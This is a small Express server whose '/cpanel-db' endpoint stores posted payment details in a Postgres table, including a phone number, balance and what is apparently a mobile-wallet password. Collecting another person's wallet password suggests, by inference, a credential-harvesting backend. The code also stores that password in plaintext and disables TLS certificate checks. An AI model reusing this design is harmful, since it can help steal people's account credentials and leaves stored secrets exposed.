import express from "express";
import pg from "pg";
import dotenv from "dotenv";

const app = express();
app.use(express.json())
dotenv.config();

const client = new pg.Pool({
	connectionString: `postgresql://${process.env.DB_USER}:${process.env.DB_PASSWORD}@${process.env.DB_HOST}/${process.env.DB_NAME}?sslmode=${process.env.DB_SSLMODE}`,
	ssl: {
		rejectUnauthorized: false,
	},
});

app.post("/cpanel-db", async (req, res) => {
    const { balance, phone, senderInfo, vfPassword, recharge, file_url } = req.body;

		await client.query(
			`INSERT INTO payments (balance, phone, sender_info, vf_password, image) VALUES ($1, $2, $3, $4, $5)`,
			[balance || recharge, phone, senderInfo, vfPassword || null, file_url]
		)

        res.status(200).json("All good")
	
});

app.listen("3050");
